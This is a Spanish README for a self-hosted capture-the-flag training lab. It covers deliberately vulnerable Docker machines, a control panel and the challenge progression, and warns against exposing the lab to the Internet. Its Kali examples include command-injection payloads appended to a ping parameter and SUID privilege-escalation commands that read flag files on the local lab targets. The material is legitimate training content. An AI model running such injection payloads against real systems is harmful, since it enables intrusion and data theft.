# 🖥️ Lab — máquinas de infraestructura

Los retos de **Web**, **Pwn** y **Pwn-Bin** son máquinas (contenedores) que levantas bajo demanda
y atacas desde Kali. Los demás enfoques son archivos. No corren todas a la vez: arrancas solo la
que vas a atacar (desde el panel o a mano).

- **Web** (30): `d01-web` … `d30-web`, puerto **8000+día** (8001…8030), HTTP.
- **Pwn** (30): `d01-pwn` … `d30-pwn`, puerto **8100+día** (8101…8130), SSH (usuario **`ctf`** / pass **`ctf`**).
- **Pwn-Bin** (12, días 31-42): `pwnbin-31` … `pwnbin-42`, puerto **8200+N** (8200…8211), **TCP
  crudo** (`nc IP puerto`) — es el mismo binario que descargas en `retos/pwnbin/pwnbin-NN/chal`,
  servido detrás de `socat` dentro del contenedor. Sin SSH, sin HTTP: un servicio pwn "pelado",
  como en un CTF real.

Cada máquina tiene **una** flag = la del reto de ese día en el panel. Cada contenedor `pwnbin-*`
tiene su **propio** `/flag.txt` horneado en su propia imagen — ninguna máquina puede leer la flag
de otra, y esa flag nunca se sirve por HTTP (ni siquiera dentro de `retos/pwnbin/`, que solo
contiene el binario).

## Requisitos
- Docker + plugin `docker compose`.
- Para el orquestador: Python 3 con Flask (`apt install python3-flask`).

## Opción A — con el panel (botones Levantar/Detener)
```bash
cd roadmap
python3 lab/control.py        # sirve el panel en http://127.0.0.1:8000/
```
Entra a `http://127.0.0.1:8000/`, abre el reto Web/Pwn del día y pulsa **Levantar máquina**.
El panel muestra el objetivo (`http://IP:puerto` o `ssh ctf@IP -p puerto`) y valida la flag.

## Opción B — a mano
```bash
cd roadmap/lab/machines/d01-web
docker compose up -d --build     # levantar
docker compose down              # detener
```

## Progresión (misma dificultad que el día del reto)

**Web** — `N1` command injection · `N2` manipulación de cookie/autorización · `N3` SQL injection ·
`N4` SSTI (Jinja2).

**Pwn** (entras por SSH `ctf:ctf` y escalas a root) — `N1` binario SUID · `N2` sudo NOPASSWD
(GTFOBins) · `N3` cron con script writable · `N4` Linux capability (`cap_setuid`).

**Pwn-Bin** (explotación de binarios real, sin privesc — `nc IP puerto`) —
`N1` overflow de una variable local vecina (desbordar un buffer para pisar un flag de
autorización) · `N2` **ret2win**: medir el offset exacto y secuestrar la dirección de retorno
para saltar a una función que nunca se llama · `N3` **format string leak**: filtrar un valor del
stack con `%N$p` · `N4` **format string write**: usar `%n` para escribir en una dirección y
activar una variable de autorización. Sin canary, sin PIE y sin CET/IBT (desactivados a
propósito para enfocarse en la técnica base); el binario descargado y el que corre en el
contenedor son **el mismo archivo**, así que lo que compruebes offline en Kali aplica igual
contra el socket real.

### Ejemplo: `pwnbin-31` (overflow de variable local) desde Kali
```bash
# 1) analiza offline el binario descargado
cp retos/pwnbin/pwnbin-31/chal . && chmod +x chal
objdump -d -M intel chal | less        # mide el tamano real del buffer
# 2) levanta la maquina (boton "Levantar maquina" o docker compose up -d --build)
# 3) ataca el socket real
nc 127.0.0.1 8200                      # o la IP de tu EC2
```

### Ejemplo: `d01-web` (command injection) desde Kali
```bash
IP=127.0.0.1                       # o la IP del host / EC2
nmap -sCV -p- $IP                                   # 8001/http
gobuster dir -u http://$IP:8001 -w /usr/share/wordlists/dirb/common.txt
curl "http://$IP:8001/robots.txt"                   # -> /internal/
curl "http://$IP:8001/ping?host=127.0.0.1;id"       # RCE (uid=www)
curl "http://$IP:8001/ping?host=127.0.0.1;cat+/home/www/flag.txt"   # FLAG
```

### Ejemplo: `d01-pwn` (SUID) desde Kali
```bash
ssh ctf@$IP -p 8101                 # pass: ctf
find / -perm -4000 -type f 2>/dev/null   # /usr/local/bin/runner
/usr/local/bin/runner ; cat /root/flag.txt   # FLAG
```

## Atacar local (Kali) vs remoto (EC2)
- **Local:** Docker en la propia Kali → objetivo `127.0.0.1`.
- **Remoto / EC2:** levanta el lab en ese host; Kali ataca a su IP. Los **contenedores**
  (Web/Pwn/Pwn-Bin) ya escuchan en `0.0.0.0` por defecto para que puedas atacarlos por red
  (restringe con la variable `BIND` del compose si quieres limitarlo a una IP). El **panel**
  (`lab/control.py`) en cambio escucha solo en `127.0.0.1` por defecto a propósito — puede
  ejecutar Docker en el host, así que **no lo publiques tal cual a Internet**: para manejarlo
  desde tu Kali cuando el lab vive en EC2, usa un túnel SSH
  (`ssh -L 8000:127.0.0.1:8000 user@ec2-ip`) y entra a `http://127.0.0.1:8000/` como si fuera
  local. Si de verdad necesitas el panel accesible por red, exporta `LAB_BIND=0.0.0.0`
  sabiendo que expones sus rutas de control.

> ⚠️ Son máquinas **deliberadamente vulnerables** y el orquestador puede ejecutar Docker en el host.
> No los expongas a Internet abierto. En EC2 usa *security groups* que solo permitan tu IP (tanto
> para los puertos de los contenedores como, sobre todo, para el puerto del panel si lo expones).

## Cómo está hecho / añadir máquinas
Cada máquina es `lab/machines/<id>/` con `Dockerfile`, `docker-compose.yml`, `meta.json`
(+ `app.py`/`entrypoint.sh`/`flag.txt`). El orquestador autodescubre cualquier carpeta con
`meta.json` + `docker-compose.yml`. Las 60 de Web/Pwn y las 12 de Pwn-Bin se generaron junto a
los 260 retos; para regenerarlas con flags nuevas, pídemelo.

Las máquinas `pwnbin-*` usan `FROM ubuntu:24.04` (en vez de `debian:bookworm-slim` como las
demás) a propósito: el binario que se sirve dentro del contenedor es **exactamente el mismo
archivo, byte a byte**, que el que descargas en `retos/pwnbin/pwnbin-NN/chal` — así nunca hay
desfases de offset entre lo que analizas offline y lo que atacas por red.
